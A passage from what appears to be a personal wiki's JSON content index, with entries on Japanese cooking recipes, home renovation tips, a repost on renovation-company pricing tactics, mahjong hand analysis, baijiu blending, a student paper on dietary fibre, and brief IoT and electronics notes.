８．揚がりはじめたら強火にしてカラッと仕上げます。 作り方のポイント 包丁で突き刺すのと叩くのは多めです。 豚の厚みは２mmが目安です。旨味と食感のバランスは２mmがベストで、それ以上薄くても厚くてもダメです。 揚げると若干縮んで厚みが増すため、叩くときは２mm以下の厚みを目安に叩いていき、途中固い所があれば切先で突き刺してからまた叩きます。 若干穴が空いても揚げるときに調整できるのでＯＫです（まとめるように入れるとくっついて穴が無くなります）。 叩くときは肉にラップを掛けて包丁の柄で叩くと汚れないので便利です。 揚がりの目安は油の音と泡の大きさで判断します。 最初グジュグジュと水分の蒸発する音がパチパチと乾いた音に変わり、小さかった泡も大きくなってきます。 豚肉は火が通りやすいので、最後は油切りも兼ねて余熱で火を通します。 余熱を通しているときはカットしません（熱を逃がさないため）。 厚みのバラつきと、ロース部分以外は熱が通りにくいので注意が必要です。","tags":[],"categories":[{"name":"日常","slug":"日常","permalink":"http://wiki.noodlefighter.com/categories/日常/"},{"name":"烹饪","slug":"日常/烹饪","permalink":"http://wiki.noodlefighter.com/categories/日常/烹饪/"},{"name":"油炸系","slug":"日常/烹饪/油炸系","permalink":"http://wiki.noodlefighter.com/categories/日常/烹饪/油炸系/"}]},{"title":"盐饭团","date":"2019-06-09T00:00:00.000Z","path":"wiki/日常/烹饪/饭团系/盐饭团/","text":"via: https://www.sirogohan.com/recipe/siomusubi/ 基础饭团 塩むすび（塩おにぎり）の作り方/レシピ調理時間：10分以下 家で作る塩むすび。わが家では土日のお昼など、炊き立てご飯を用意して各自が塩むすびにするなんてことがよくあります。 何気ない普段のご飯だけど、丁寧に作れば、とっても幸せな気持ちにさせてくれるんです！握る前のコツ、塩加減、握り方などを詳しく紹介したいと思います。 塩むすびの材料 (作りやすい分量で) 炊き立てのごはん … 適量 塩 … ひとつまみ（詳細は下記に） その他用意するもの … 氷水、清潔なふきん 塩むすびの作り方塩むすびの下準備美味しい塩むすびを作るために必要なものは『炊き立てのご飯』『塩（あれば自然塩）』『氷水と清潔なふきん』です。 まず、はじめにお米を炊飯器にセットして、炊き上がったら塩むすびに取り掛かりましょう！ 塩むすびの手水について塩むすびの材料は「ごはんと塩だけ」といたってシンプルなので、ご飯の美味しさを引き出しつつ、できるだけ味を損なわないようにして作りたいと思います。 まずは前述した『炊き立てごはんである』ということ。炊き立てだからこそ、ふっくらと、形よく、しかも美味しい塩むすびになってくれます（炊けたご飯は上下を返してほぐし、軽く蒸気を逃がしてもOK）。 続いて、炊き立てごはんを直に握るのでそのままでは熱くて握れません。なので『握る前に氷水で手をしっかり冷やしてから、炊き立てごはんを握る』とよいです。氷水に浸す時間は握る直前に10秒ほどでOKです。 では氷水で冷やした手をどうするかというと、清潔なふきんで水気をある程度ふき取ります。これはおにぎりを水っぽくしないためなのですが、炊き立てごはんであれば、手の水気をふき取っても、ごはんが手にくっつかないからでもあります。 ※「水気をある程度ふきとる」というのは、完全に乾いた状態にしないくらいの気持ちです。手に水がたっぷり残った状態で握るのはNGですし、この後塩を手に広げるので、その塩が手になじみやすいくらいの少しの湿気が手に残るくらいがいいと思います。 塩むすびの塩加減水気をふいたら、続いて塩を手に広げます。このとき、茶碗に軽く1杯のごはんに対して、指3本で塩をつまむ（これでだいたい0.4〜0.5ｇ）くらいの塩加減でよいと思います。指で取った塩は両手に広げます。 ここで気を付けたいのは、すぐ食べるときの塩加減はひとつまみでよいですが、冷めてから食べるときは塩気が弱く感じるので、もう少し塩を多めにしてもよいと思います。塩加減については好みや合わせる料理ともかかわってくるので、適宜調整しながらやってみてください。 塩むすび（おにぎり）の握り方氷水で冷やした手に、塩を広げ、そこにまだ熱いごはんをのせて握っていきます。※氷水でしっかり冷やせば、熱いご飯をのせて握っても基本的には大丈夫だと思います。でも熱くて我慢できないときは無理をせずに、まな板や食器に移し、少しだけ粗熱を取ってから握ってみてください※ 握りはじめは、あまり形を気にせずにご飯同士がくっつくようにやさしくまとめ、ご飯がまとまれば、右手を山にしておにぎりの角を作り、左手でおにぎりの底を作る、という気持ちで、転がしながら数回握ります（力を入れすぎないようにしつつ）。 おにぎりがふんわりと握れたら、おにぎりの側面を一度ならして（手の上でおにぎりを横において上下からやさしく手を押し当てて形を整え）、最後にもう一度おにぎりを軽く握って、完成です。 補足 握りたてはまだ湯気が出ている、くらいの仕上がりが最高に美味しく、まさに塩むすびだけでも究極のごちそうに感じられます！ ただ、やけどしては大変なので、熱いのが苦手な方はごはんの粗熱を少し取ってから握るとよいです。","tags":[],"categories":[{"name":"日常","slug":"日常","permalink":"http://wiki.noodlefighter.com/categories/日常/"},{"name":"烹饪","slug":"日常/烹饪","permalink":"http://wiki.noodlefighter.com/categories/日常/烹饪/"},{"name":"饭团系","slug":"日常/烹饪/饭团系","permalink":"http://wiki.noodlefighter.com/categories/日常/烹饪/饭团系/"}]},{"title":"装修","date":"2019-06-09T00:00:00.000Z","path":"wiki/日常/装修/装修/","text":"新风系统几个大功能：湿度调节、过滤空气中的灰尘、热交换省空调费用。 可以不用开窗了，灰尘少了也减少打扫，南方潮湿问题也解决了，虫鼠也不容易进屋。 防鼠如果你喜欢在夏天时敞开大门，以让微风吹进屋内，那就安装纱门防止老鼠进入。封住窗户。老鼠善于爬行，能毫无困难地通过窗户进入屋内，特别是二楼窗户。时时确保窗户紧闭或安装纱网。如果你久未检查纱窗，请绕着屋子一一检查它们。纱窗用了一段时间后容易损坏，网纱上生了锈的小洞或裂缝都能让老鼠进入。如果有的窗户无法紧闭，或是窗户与框架之间有空隙，你可用钢丝绒或钢丝网堵住该空隙。检查屋子底部。另一个可能让老鼠进入屋内的地方是墙壁的裂缝，特别是靠近窗户及入口通道的裂缝。沿着屋外绕一圈，检查墙壁上是否有能让老鼠进屋的裂缝或孔洞。将你找到的任何大于6.4毫米的孔洞堵住。最好使用坚固的修补材料，比如金属薄片、钢丝网或混凝土灰浆。否则老鼠或许能很快地咬穿较脆弱的材料，然后再度进入你的屋子。检查隔开车库与屋子其它空间的墙壁。由于车库门比其它较小的门更难密封，因此有时候老鼠通过该处进入屋内，之后再寻找方法进入主屋。","tags":[],"categories":[{"name":"日常","slug":"日常","permalink":"http://wiki.noodlefighter.com/categories/日常/"},{"name":"装修","slug":"日常/装修","permalink":"http://wiki.noodlefighter.com/categories/日常/装修/"}]},{"title":"如何优雅地拒绝装修公司的套路","date":"2019-06-09T00:00:00.000Z","path":"wiki/日常/装修/如何优雅地拒绝装修公司的套路/","text":"作者：老曲 via: https://www.zhihu.com/question/64026921/answer/699010517 都面对套路了，为何要优雅呢？ 我愿意为好东西付钱，但我不愿意被你的套路胁迫着付钱；今天写这篇文章，希望理性高知的朋友，能远离骗局。 警世恒言：如果你有占便宜的心态，离上当就不远了。（文末有防骗工具，可以下载打印出来） 讲一个我老家同学的真实故事，我们叫他老夏，做软件行业的。去年买了房要装修，想找我们做。但是因为不在上海，我们做不了，只能在当地找公司。 过年在天津见了个面，我问他装修的体验如何。 老夏的原话：“我就像《西部世界》里的AI，感觉一切都被人设计了。” 他感受最深的，就是从开始到签约的过程，一步一步被套路了。 他家100平米左右，预算硬装部分能接受20万左右，也咨询过我，我说这是一个很正常的品质装修的价格。建议他别图便宜，找一个和他匹配的公司，报价在1500～2000左右的，主打生活品质的公司。别一味追求便宜，那种装修都针对的是第一次装修的年轻人，不适合你这种拉家带口奔四的人，容易上当。 但一到网上平台找资讯，像什么齐家土巴兔，点评58，还有当地的公交广告，发现价格都非常便宜，499套餐都有人做，所以异常开心，觉得装修可以省不少钱，也就把我之前的提醒抛到一边了。 最终确定了3家套餐装修公司，我们姑且叫A、B、C。A、B两家是999元／平米的套餐，C家是从699到1299元／平米都有，3到5个风格可选（其实就一种风格，墙面全涂料落地，不同颜色而已）。产品标准，宣传手法都是一摸一样，无非就是好设计，好风格，好材料，好工程，好服务，好信用。反正什么都好，流程也都一模一样，电话预约，参观样板，然后量房设计。同质化这么严重，到底怎么选呢？只有先拼设计了。 到这里出现第一个分歧点，就是设计费。 三家的收费标准有差距，A家免费，B家2000，C家3000。老夏个理工男，居然做了个思维导图，我给大家还原出来看看： ▲我觉得这种方法还是值得借鉴的 所以他开始让A和C继续做设计，过程忽略，不是重点。最终设计方案由于他自己在中间的不停修改，也非常接近了。但是C家的设计师明显水平高一点，收费了嘛，更专业一点。 重点是报价，报价，报价 原本说好的套餐是999和699，感觉10万以内就能搞定的，去完样板房，就发现套餐里面好多东西都没有，都需要加钱，但总体觉得，最多15万应该能搞定了吧，等设计做完，两家报出来的价格A公司26万多，C公司18万多，但是不做柜子和新风地暖，自己做完加上去也要25万多了。老夏傻眼了，赶紧分析原因。发现原来“套餐”的定义，和他们最初的宣传，以及展示的样板房完全不一样！ 以A公司的报价为例，我也做了一个表格，方便大家看到从广告宣传，到样板房接待，到最终设计完成报价之间的差距。 C公司也差不多，但是比较离谱的是，过程中干脆让老夏换了1299的套餐，说这样比单独一项一项增加要划算，感觉就像KFC的套餐逻辑一样。 大家注意，这里包含了三个阶段的思维绑架套路 第一阶段：广告宣传，大量的美图，照片，里面可是什么都含的，再加上宣传语“套餐制，999元／平米一价全包”，给你的预期就是啥都有了，只要10万，目的是让你感觉特别“便宜”，占了大便宜了，然后先来到样板房，和设计师有接触； 第二阶段：样板房做的酷炫，尤其灯光和衣柜，都是给你一个预期，你家就能实现这个状态，然后用设计师的引导，告诉你“因为每户都不同，所以套餐不可能所有的东西都有，给你定制的过程中，是会有所增加的。具体要做完设计才能确定。 加上“你不问，他不说”的刻意隐瞒。营造出三种预期，首先用一个道理让你接受，感觉加价是合理的，找谁做都是这样的更重要的，让你预期钱会多一点，但怎么着也就12、3万搞定了，依然很划算。一旦你接受了前面这两个暗示，价格合理，而且还很便宜，很容易推倒出第三个暗示，就是设计是由你自己来确定的，因此“丰简由己”，选择权在你自己，再贵也不会受骗上当。 第三阶段：就可以放手做设计，每个设计都让你来确定，每次确定都不明确告诉你价格，最多透露一下的就是，这个东西你要增加，还是要加钱的。就像切香肠一样，一刀一刀切，一点一点叠加。最终生成了这么一个吓人的装修报价。 最终结果，老夏虽然选了其中一家，但是回想起来，感觉就是别套路了，心理特别不舒服。所以他特别想让我写一下他的经历，当然是匿名的，并且希望我想出一个办法，在这种套路遍天下的装修市场，怎么能弄出一个反套路宝典来。所以才有了这篇文章。 套餐装修，其实最开始的初衷是，让报价清晰简单，容易理解，防止客户受骗才产生的。所以刚出来那几年，体验还是挺好的。但是自从有些公司打出了399、499元的套餐以后，反而变成一个报价套路了。也是好经也能被念歪了。 #怎样预防，我给大家三招# 第一招：一句话问死你 一定让接待你的人，回答这个问题：“我就要你们样板房的配置，灯、吊顶一个不少，我家总共需要多少钱？”这个时候就见人性了，你会发现接待你的人一定身体还是蜷缩，说话支支吾吾，以每家不一样来推脱。别管他，我跟你保证，他一定知道答案，否则他干不了这行。就看他愿不愿意说了。 第二招：用表格问死你 欺骗的另一种表现形式，就是故意隐瞒，就是“你不问，他不说”。没关系，我给大家一个表格，包含了套餐装修最容易产生价格“歧义”的14项问题，你可以对着这张表，一项一项问，自然能把实情炸出来。 第三招，信息了解全面之前，不签订任何协议，哪怕是设计合同 我之前一再强调，设计费最好独立付费，这样一方面设计质量有所保证，另一方面，干净的设计合同，不会让你觉得你亏欠设计师，自然很难被绑架。但是套餐装修是一个打包服务，签订设计合同以后，基本上设计很难独立使用。 所以，一旦签订设计合同了，就意味着基本上被绑定了。所以，务必在签订设计合同之前，就尽可能把套餐施工、材料部分的信息全部了解清楚以后，再签订设计合同。","tags":[],"categories":[{"name":"日常","slug":"日常","permalink":"http://wiki.noodlefighter.com/categories/日常/"},{"name":"装修","slug":"日常/装修","permalink":"http://wiki.noodlefighter.com/categories/日常/装修/"}]},{"title":"在意的牌谱","date":"2019-06-09T00:00:00.000Z","path":"wiki/日常/麻将/在意的牌谱/","text":"记录在意的牌谱 0 问题：如上牌型，如果以成牌率优先，进了8索如何舍牌？ 疑惑 以这个牌型候牌，如果进w3，5或p2，5，8都能直接听牌，但这时来了s8就很尴尬，这会是一个改良听型的机会吗，先说结论：是的。 分析 打s8的情况（也是获得改良前的情况） 等来w3,5（8张） —> 听p3,6,9（11张） 等来p3,6,9 （11张） —> 听w3 或 听w5（4张） 共等19张牌，其中8张是良型听牌。 打w2的情况 等来w4,6（6张） —> 听p3,6,9（11张） 等来w5（4张） —> 听p4,7 或 听p5,8（6张） 等来p3,6,9（11张） —> 听w4 或 听w6（3张） 等来p4,5,7,8（12张） —> 听w5（4张） 共等33张牌，其中10张是良型听牌。 待牌相差了14张，可见明显舍2w，对待牌进行改良来得划算，但有改良后会不会降低听牌的张数呢，若对听牌数以等待张数算加权平均数： 12舍s8听牌数 = (11*8+4*11)/(8+11) = 6.9舍w2听牌数 = (11*6+6*4+3*11+4*12)/(6+4+11+12) = 5.8 结论是，会降低听牌张数，但这比起一向听时待牌差相差的14张，是可以忽略的。 瞎逼逼 w2自己打过，应该考虑优先舍去 打错就打错了，不是良型，那么默听就好了 1振听立直，不知道之前的择牌有没有问题。。 2 如果有立直的话是147m，这里1m没番+振听。那一般就是打5m，听47m（7张）。其实还有一个选项，打6m，听5m47p（6张）。 3 4这时候应该切8s场上已经没有8s了，切8s等7s 5听四面 6单吊改听三面，没看出来，这里做个记录： 摸上7s，没看出三面，觉得场上47s都没了(*如果这里立了，过几巡就自摸了)： 摸上5s，还是没看出三面，不然就是更好的58s,7w了： 最后立了个啥？？？ 7 放的3p点了上家的庄，11600 8 何切？ 9 何切 34445556","tags":[],"categories":[{"name":"日常","slug":"日常","permalink":"http://wiki.noodlefighter.com/categories/日常/"},{"name":"麻将","slug":"日常/麻将","permalink":"http://wiki.noodlefighter.com/categories/日常/麻将/"}]},{"title":"白酒勾兑工艺","date":"2019-06-09T00:00:00.000Z","path":"wiki/杂学/白酒勾兑工艺/","text":"via: 月风_投资笔记 茅台是用“基酒+食用酒精”勾兑这个事情，基本上每一个看过茅台相关年报和资料的人，都对此一清二楚。 原因其实很简单，白酒的香味和口感，主要来自于各种酸、醇、脂、醛酮和芳香族化合物。 本质上讲，这些传统酿酒方法下容易产生的衍生物，只要一丢丢含量，就能极大地改变白酒的香味和口感。——用大家可以理解的比喻来看，很少一点的糖精、香料就可以给一大锅的麦芽糖调出逼真的水果味。 这些化合物的微妙比例，既是白酒不同于食用酒精的根本性优势，也是白酒过去难以被广泛接受的负面原因。 过去，由于白酒的酿造年份更长、度数（或者说转换率）更高，这些化合物的含量，是明显高于红酒、啤酒等其他品类的，这使得白酒的芳香味更加浓郁和复杂，但是也带来了根本性的问题：容易上头。 对的，上个世纪民众一直有一个印象，喝白酒特别容易上头，就是因为里面杂醇和醛类这种有害化合物的占比过高，直接导致我们的神经系统受损，就出现了所谓的“上头”现象。 从这个角度上讲，早年茅台五粮液等高端品种的脱颖而出，一方面是因为陈年酒可以一定程度上让醛类多挥发一些；另一方面，他们的酿造工艺相对成熟和稳定，使得酒的整体品质稳定，杂质也少一些。也就是一些老酒鬼们常说的，茅台不上头，所以一定很养生（个屁）。 但是，随着勾兑工艺的崛起后，这些问题都被根本性解除了，整个白酒行业迎来了极大的发展期。 第一，白酒工程师们确认，原来白酒的香味和口感是这些含量极其微少的醇、脂、醛酮和芳香族化合物形成的，而且“适量”稀释、重新勾兑后，并不会根本性改变其口感。那么勾兑这门工艺的成本基础就因此确立了，类似于糖精可以勾兑一大缸水但是甜度不会明显衰减； ——白酒终于可以大体量、规模化的生产和销售了。 第二，在明显降低了基酒含量，更多的采用了高纯度食用酒精作为主体后，极大地降低了酿造工艺和基酒成品质量的要求。如果都是原浆酒的话，过去为了控制杂质含量和口味变形程度，在工艺和成本上是有一定门槛的。但是如果用勾兑方式，反而一定程度上降低了对杂质的含量控制要求。现在工业生产的白酒，不管价格高低，基本上都不会出现喝酒上头的问题了； ——说人话的话，你想喝到那么多的杂醇和醛类让自己上个头，不好意思，还真没有，95%以上都是高纯度的食用酒精。 第三，在搞明白了白酒的香味和口感来源后，工程师就可以在此基础上更进一步，开始用现代化学工艺，加快或者说催化中间的微生物转化速度。所以，现在市场上见到的所谓的XX年份酒，一方面里面只有一小部分基酒，另一方面，即使这些基酒部分，实际酿造年份可能也就3-5年，但是用各种催化手段，加速实现了理论上20年的酿造结果； 第四，所谓的现代勾兑白酒，看起来是多少年白酒文化传承，但是骨子里，依然是国内伟大的化学工艺、科学认知、成分分析、催化技术的进步。 ——就好像中成药里起效的其实还是XX成分一样。 所以吧，白酒现在真的是一个准奢侈品的概念，大家都知道成本不值这个钱，早晚也都会知道，里面的基酒或者说原浆酒占比很低。但是大家在意的不是它的成分，而是它的用途。 ——没人真把爱马仕当作装东西的袋子用，高端白酒同理。 真心希望中国能迎来一个，大家都活得更简单，喝着食用酒精更为随性，而非纯应酬的时代。 不过在A股学了这么多亏钱知识后，我最大的收获是，到任何地方，都不轻易喝所谓的自酿酒、土法酒，好不好喝无所谓，喝一肚子杂醇和醛类，甚至喝到甲醇，那玩笑就大了。","tags":[],"categories":[{"name":"杂学","slug":"杂学","permalink":"http://wiki.noodlefighter.com/categories/杂学/"}]},{"title":"牛肉饼","date":"2019-06-09T00:00:00.000Z","path":"wiki/日常/烹饪/油炸系/牛肉饼/","text":"牛肉饼，尝试做了一次味道不错，然而太耗时间，主要是把材料都剁碎混合比较麻烦。吃多了也有点腻毕竟算油炸食品，感觉如果有厨房纸把油吸一吸会好点。 via : http://www.cafenavijp.com/hanba-gu.htm ふわふわハンバーグの作り方/レシピ家庭でも人気の高いハンバーグ。しかし、美味しいハンバーグを作るにはいくつかのコツがあります。ここでは、ふわふわハンバーグの作り方を紹介します。 材料 （４人前） （ここでの写真はすべてレシピの倍の分量になっています） 合挽き肉（牛７：豚３） ４０ 塩 ４ｇ 玉ねぎ ２５０ｇ パン粉 ５０ｇ 卵 １個 コショウ 適量 １．最初に玉ねぎをミジン切りにして色付くまでよく炒め、ボールへ取り出して荒熱をとります。 玉ねぎを炒めるのは、ハンバーグは蒸し焼きなので玉ねぎの水分を飛ばして焼きやすくする為と、甘味を引き出す為です。 ２．挽肉に対して１％の塩を入れ、手早く練ります。２～３分を目標に、よく練りましょう。塩はタンパク質を分解し、つなぎの役割をします。 ３．パン粉に適量の水を加え、ふやかしてからよく絞ります。水のかわりに牛乳でもかまいません。 ４．すべての材料を練り合わせます。ナツメグなど、好みの香辛料があればここで加えます。ここでも手早く練りましょう。 ５．４等分して両手でキャッチボールしながら空気を抜き、形を整えます。 ６．焼く前にパン粉を両側に付け、余分なパン粉は払い除けます。このときに付けるパン粉はコゲ目を付けやすくするためのものなので、ほんの少し付けるイメージで余分なパン粉は必ず叩いて除けて下さい。 パン粉が付き過ぎるとメンチカツになってしまいます。 焼くときには真ん中をヘコまし、型崩れを防ぐ為に必ずヘコんだ方から先に焼きます。火加減は中火です。油臭さをとる為に、油もよく熱しておきます。 ７．スグにフタをして蒸し焼きにし、中火のまま焼きます。片面がシッカリ焼けたら引っくり返し、またスグにフタをして反対側を焼きます。 最後に火加減を若干強くして、両側の表面をカラッと焼き揚げます。 作り方のポイント 玉ねぎは細かいミジン切りにします。肉と玉ねぎの間に隙間を作らないようにする為です（肉汁の流出を防ぎます）。 肉はよく練ります。練りが甘いと肉汁が流れ出て、ボソボソしたハンバーグになります。 パン粉は肉汁を吸うように、水をよく絞っておきましょう。 ハンバーグは真ん中をヘコまして焼きます。焼くと肉が縮んで真ん中が膨らむので、焼きやすくする為（生焼けを防ぐ）です。 厚みは１．５～２cmぐらいがベストです。薄すぎると肉汁が中に留まることができず、厚すぎると火の通りが遅くなり、結果的に肉汁が流出します。 空気はよく抜き、表面はできるだけ滑らかに整えて裂け目などをなくします。肉汁を包み込む為と、型崩れを防ぎます。 最後のパン粉は焼き目を付けるためなので少量です。カリッとした食感が必要なければ付けなくてもかまいません。 食感のアクセントとしては、粗く刻んだタマネギを最後に少量入れてシャクッとした食感を足しても美味しいです。 できるだけ短時間で焼き上げる為に、中火～中弱火をキープして焼き上げます。肉汁の流出を防ぐ為です。 油は少し多めにします。最後に表面をカラッと揚げる為です。 途中できるだけ裏返さないようにし、フライパン返しなどでハンバーグを叩かない（押し付けない）ようにします。これも肉汁の流出を抑える為です。 最小限の裏返しと、最後にカラッと表面を焼き揚げる（揚げるイメージで）のがポイントです。外側がカリッと、内側がジューシーなハンバーグに仕上がります。 たまによく練らずにやわらかいハンバーグと言われることがありますが、それは空気の入ったやわらかさで、ハンバーグのやわらかさとは関係ありません。 また、肉汁の流出が早くなるのでボソボソになります。 卵とパン粉がつなぎと言われることもありますが、卵は滑らかさを出す為で（口当たりを良くする）、パン粉は肉汁を吸う為とやわらかさを作ります。 パン粉は少し粉っぽく感じるようだと量を減らして調整します。弾力のある肉の食感を楽しみたい場合もパン粉の量を減らします。 最後の決め手は好みで調整し、自己流ハンバーグレシピを完成させましょう。","tags":[],"categories":[{"name":"日常","slug":"日常","permalink":"http://wiki.noodlefighter.com/categories/日常/"},{"name":"烹饪","slug":"日常/烹饪","permalink":"http://wiki.noodlefighter.com/categories/日常/烹饪/"},{"name":"油炸系","slug":"日常/烹饪/油炸系","permalink":"http://wiki.noodlefighter.com/categories/日常/烹饪/油炸系/"}]},{"title":"膳食纤维与食品健康","date":"2019-06-09T00:00:00.000Z","path":"wiki/杂学/膳食纤维与食品健康/","text":"大学时学营养学时留下来的结课论文 摘要：膳食纤维作为健康饮食中不可缺少的一部分，近年来膳食纤维成为大众健康饮食的热点。本文通过介绍膳食纤维的功能、来源、利用方法、副作用等进行分析，指出膳食纤维与人体健康的相关性。 关键词：膳食纤维；健康饮食；现代饮食 一．引言 膳食纤维是七大营养素中的第七大营养素，指不能被人体消化道酵素分解的多糖类及木植素，常见的有纤维素、半纤维素、树脂、果胶及木质素等，它们虽然不能被人体胃肠消化酶消化，也不能被人体吸收。虽然对人体来说没有营养价值，但确是人体不可缺少的营养素，纤维在保持消化系统健康上扮演着重要的角色。[1] 二．作用 膳食纤维分为可溶性纤维和不可溶纤维。 可溶性纤维包括果胶、树胶、黏胶等，它既可以溶于水也可以吸水膨胀。可溶性纤维具有结合胆酸和胆固醇的特性，抑制胆酸和固醇的再吸收。它们还具有减缓餐后血糖吸收的功能，缓慢血糖量的增加尤其对糖尿病患者意义重大。可溶性纤维能被肠道中的细菌酵解，产生的短链脂肪酸可作为肠道细胞和肠内细菌的能量来源，促进有益菌生长繁殖，维持菌群平衡[1]，对维持肠道功能意义重大[3]。它还对阳离子有结合能力，使膳食纤维对重金属阳离子有一定的吸附作用。再则，可溶性纤维吸水后会胶化，此时它有保护肠胃黏膜和增加饱腹感做的作用。[2][5] 不可溶纤维包括纤维素、半纤维素和木质素等，它们无法溶于水但是有很强的吸水能力，他的主要作用是：增大粪便体积，加快粪便转运的速度，减少其中有害物质接触肠壁的时间[3]。这些的作用表现在生活中，就是降低胀气、便秘等问题的发生几率。 另外，膳食纤维还能对某些食品添加剂、残留农药、洗涤剂等有害物质起吸附作用，减少对人体的伤害，因它产生的饱腹感还可以帮助人控制体重。 三．来源 膳食纤维主要来自于植物的细胞壁，所以来源丰富。尤其是粗粮、根菜类和海藻类中含量较高。常见食物中的大麦、豆类、胡萝卜、柑橘、亚麻、燕麦等食品都含有丰富的膳食纤维。 四．现代饮食中的膳食纤维 关于现代化对膳食纤维摄入的影响，由于中国对于膳食纤维相关调查较少，我们把目光转向同样以大米为主食的日本国，据资料显示二战前日本人平均每日排便350g，但在战后50年的里已经减少到一百多克[6]，主要原因就是战前每人每日平均摄入27g膳食纤维而战后减少到了12g[7]。 粪便转运减速同时使大便水分大量被人体吸收，粪便过干又使转运速度变慢，如此的恶性循环增加了便秘的出现几率。 由上述例子可知，随着现代社会中生产工艺的进步和食品种类的剧增，人们吃的东西越来越精细，人的粪便量越来越少，随之产生的便秘、肥胖、皮肤粗糙等问题一直困扰着都市人。膳食纤维能减少粪便在体内的停留时间，可以增加饱腹感，所以多食用膳食纤维是解决这些健康问题的最有力、科学的方法。 食用高膳食纤维食品，对预防高血脂症、高血压、心脏病、糖尿病、肥胖症效果明显，因此人们对膳食纤维越来越重视了。 五．膳食纤维的利用方法 1）对于大众来说增加生活饮食中粗粮蔬菜水果的比重，少吃精加工食品是最直接提高膳食纤维摄入量的方法 2）可以制作植物纤维产品，例如制作健康饮料，1988年在日本获得成功的饮料“Fiber—Mini”，一款聚葡萄糖（一种可溶性膳食纤维）饮料。 3）提取或合成膳食纤维作为食品添加剂。膳食纤维的添加可以改变食物口感和粘稠度。葡聚糖还被用作油脂的代用品。 六．副作用 由于糖醛酸的羧基可在胃肠内结合无机盐，如钾、钠、铁等阳离子形成膳食纤维复合物，影响其吸收。多度摄入膳食纤维会过度刺激肠粘膜，对消化吸收不利[4]，尤其是对于儿童来说，高纤维的饮食是十分不可取的。 一般认为一日膳食纤维总摄入量可达40克—50克，但过多的膳食纤维将影响维生素和微量元素的吸收，因此建议每日总摄入量在20克—30克为宜。 所以食用膳食纤维并不是多多益善，而应该适量。 七．结语 无膳食纤维对人体健康的帮助，首先的就是人体排毒的速率，生命在于更新（也就是新陈代谢），所以说膳食纤维对人体健康而言是很重要的。人类对于膳食纤维功能的认知历史很短，原以为食品中对人体毫无帮助的一类物质竟然被挖掘出那么多对人体有益的重要功能，可见人类使用科学方法探索真知的路途还很遥远，在探索未知领域的时候，抛开成见，用好奇心去寻找的知识才是我们对科学研究应有的态度。 参考文献： [1]王翠玲等.营养与膳食[M].第二版.上海：上海科学技术出版社，2010,29-30 [2]高橋 陽子.繊維質と食物繊維[J].日本食品科学工学会誌,2011,58,186 [3]1182990968等网友.膳食纤维_百度百科[OL].http://baike.baidu.com/view/178.htm [4]马龙江.现代食物成分与膳食营养[M].黄河出版社,1998-9,27 [5]藤田昌子 長屋聡美.食品の違いによる食後血糖への影響[D].岐阜女子大学紀要,2003,32, 131-136 [6]Hfuchino等网友.糞- Wikipedia[OL].http://ja.wikipedia.org/wiki/%E7%B3%9E [7]藤田纮一郎 寄藤文平.大便书[M].北方文艺出版社,2008,39","tags":[],"categories":[{"name":"杂学","slug":"杂学","permalink":"http://wiki.noodlefighter.com/categories/杂学/"}]},{"title":"IoT组网方式","date":"2019-06-09T00:00:00.000Z","path":"wiki/电子工程/IoT/iot组网方式/","text":"TODO 继续整理、拆分 概念LR-WPAN低速无线个域网 REST架构表述性状态传递（Representational State Transfer）Roy Fielding博士提出的软件架构风格，网络应用的设计开发，降低开发的复杂性，提高系统的可伸缩性是一组架构约束条件和原则似乎核心思想是：通过URL设计Web系统 参考 相关：另外两种主流Web服务方案为SOAP和XML-RPC 规范&协议802.15.4规定了物理层phy和媒体访问控制层mac 6LoWPAN802.15.4 + IPv6 低速率，对于2.4GHz、828MHz、915MHz 3个频段分别对应250Kb/s、20Kb/s和40Kb/s3种速率 低功耗，在待机模式下可使用2节5号干电池驱动6个月以上 低成本，一般采用硬件资源非常有限的底端嵌入式设备或更小的特殊设备 短距离，节点信号覆盖范围有限，一般为10－100m 低复杂度，比现有的标准低；⑥短帧长，最大帧长度为127字节 多拓扑，网络拓扑结构丰富，支持星型拓扑和点对点拓扑2种基本拓扑结构及其混合组网。来源 CoAPhttp://coap.technology/ 6LowPAN协议栈的应用层协议 替代http最小数据包仅4byte 运行在UDP上参考 相关开源库libcoap : A CoAP (RFC 7252) implementation in C, simplifiedBSD可商用. TLSTransport Layer Security 安全传输层协议安全传输层协议（TLS）用于在两个通信应用程序之间提供保密性和数据完整性。该协议由两层组成： TLS 记录协议（TLS Record）和 TLS 握手协议（TLS Handshake）。较低的层为 TLS 记录协议，位于某个可靠的传输协议（例如 TCP）上面，与具体的应用无关，所以，一般把TLS协议归为传输层安全协议。来源 相关开源库s2n DTLSMQTTLWM2MNB-IoTNarrow Band Internet of Things蜂窝窄带物联网","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"IoT","slug":"电子工程/IoT","permalink":"http://wiki.noodlefighter.com/categories/电子工程/IoT/"}]},{"title":"lora","date":"2019-06-09T00:00:00.000Z","path":"wiki/电子工程/IoT/lora/","text":"TODO https://www.rs-online.com/designspark/building-a-raspberry-pi-powered-lorawan-gateway-cn","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"IoT","slug":"电子工程/IoT","permalink":"http://wiki.noodlefighter.com/categories/电子工程/IoT/"}]},{"title":"ble","date":"2019-06-09T00:00:00.000Z","path":"wiki/电子工程/IoT/ble/","text":"https://draapho.github.io/2017/04/19/1713-ble/ https://www.bluetooth.com/specifications/gatt/descriptors http://yegang.hatenablog.com/entry/2014/08/09/195246 调试工具hcidumpbtmonhcitoolgatttoolbluetoothctl","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"IoT","slug":"电子工程/IoT","permalink":"http://wiki.noodlefighter.com/categories/电子工程/IoT/"}]},{"title":"mosfet","date":"2019-06-09T00:00:00.000Z","path":"wiki/电子工程/mosfet/","text":"mos管 https://wenku.baidu.com/view/677d0b56a300a6c30c229f5a.htmlhttps://wenku.baidu.com/view/5343fa54c281e53a5802ff59.htmlhttps://electronics.stackexchange.com/questions/79298/what-does-no-bulk-mean-in-mosfets 用途:http://www.chinafix.com/thread-595112-1-1.html 信号切换(只要求电压)要求导通压降小 电流通断(输出电流)两方面均有要求","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"}]},{"title":"双核异构","date":"2019-06-09T00:00:00.000Z","path":"wiki/电子工程/嵌入式硬件/双核异构/","text":"应用处理器双核异构 TI的C2000 